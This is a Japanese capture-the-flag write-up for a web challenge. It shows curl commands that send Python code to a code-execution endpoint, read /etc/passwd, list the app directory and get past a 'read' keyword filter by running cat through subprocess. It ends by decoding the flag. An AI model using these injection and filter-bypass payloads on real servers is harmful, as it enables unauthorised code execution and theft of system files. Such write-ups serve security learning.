# How to read read without read:Web:630pts
Can you bypass their WAF 😉 they are so confident about it.  
[Click here](https://ch2.sbug.se/)  

# Solution
アクセスすると何やらコードが実行できそうなページだが送信できない。  
[site.png](site/site.png)  
```bash
$ curl https://ch2.sbug.se/
~~~
  <!DOCTYPE html>
<html>
<head>
    <title>How to read read without read</title>
<script async src='/cdn-cgi/challenge-platform/h/b/scripts/invisible.js'></script></head>
<body>
    <h2>How to read read without read</h2><br>
    <div class="submitter">
    <form id="submitter" method="post" action="submit">
        <label><b>Enter your code here</b>
        </label>
        <textarea type="text" name="code" id="code" placeholder="print('hello world')"></textarea>
        <br><br>
        </b>
        </label>
        <!--input type="button" name="btn" id="btn" value="Run"!-->
    </form>
</div>
~~~
```
ボタンが隠されているようだ。  
普通にPOSTすればよいが、言語が不明なのでいろいろと試す。  
```bash
$ curl -X POST https://ch2.sbug.se/submit -d "code=print(list('abc'))"
<html>['a', 'b', 'c']
~~~
$ curl -X POST https://ch2.sbug.se/submit -d "code=print(open('/etc/passwd').read())"
<html>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
~~~
```
Pythonのようだ。  
ディレクトリを覗く。  
```bash
$ curl -X POST https://ch2.sbug.se/submit -d "code=print(__import__('os').listdir())"
<html>['static', 'homeapp', 'flag', 'entrypoint.sh', '.git', 'read', 'init.sql', '.idea', 'dockerfile', 'sampleApp', 'docker-compose.yml', '.gitignore', '.env', 'requirements.txt', 'manage.py', 'file.sh', 'nginx']
~~~
```
`read`なるファイルがあるので読み出せばよいが、readが使えない(500エラーになる)ようだ。  
subprocessを使えばよい。  
出力が崩れたのでbase64をかませている。  
```bash
$ curl -X POST https://ch2.sbug.se/submit -d "code=print(__import__('subprocess').check_output(['cat','read']))"
<html>b'SBCTF{<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2b7c647c74521b5e74436b5d18">[email&#160;protected]</a><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="85dae7fcf5c5">[email&#160;protected]</a>$$3d_!t}\n'
~~~
$ curl -X POST https://ch2.sbug.se/submit -d "code=print(__import__('base64').b64encode(__import__('subprocess').check_output(['cat','read'])))"
<html>b'U0JDVEZ7V09XX3kwdV9oQHYzX2J5cEAkJDNkXyF0fQo='
~~~
$ echo "U0JDVEZ7V09XX3kwdV9oQHYzX2J5cEAkJDNkXyF0fQo=" | base64 -d
SBCTF{WOW_y0u_h@v3_byp@$$3d_!t}
```
flagが得られた。  

## SBCTF{WOW_y0u_h@v3_byp@$$3d_!t}